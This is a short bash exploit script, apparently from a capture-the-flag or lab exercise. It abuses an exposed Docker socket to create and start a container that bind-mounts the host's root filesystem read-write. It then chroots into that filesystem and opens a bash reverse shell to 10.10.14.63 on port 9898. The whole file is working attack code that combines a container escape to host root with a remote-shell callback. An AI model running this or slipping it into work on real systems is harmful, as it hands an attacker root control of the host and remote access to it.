#!/bin/bash

# the command executed when the container is started
# change dir to tmp where the rootfs is mount and execute reverse shell
cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i >& /dev/tcp/10.10.14.63/9898 0>&1'\\\"\"]"

# create the container and execute command, bind the root filesysstem to it, name the container xkyrage_root2. (-d = detached)
curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"image\":\"sandbox\",\"cmd\":$cmd,\"Binds\": [\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=xkyrage_root2

# start the container
curl -s -X POST --unix-socket /var/run/docker.sock "http://localhost/containers/xkyrage_root2/start"
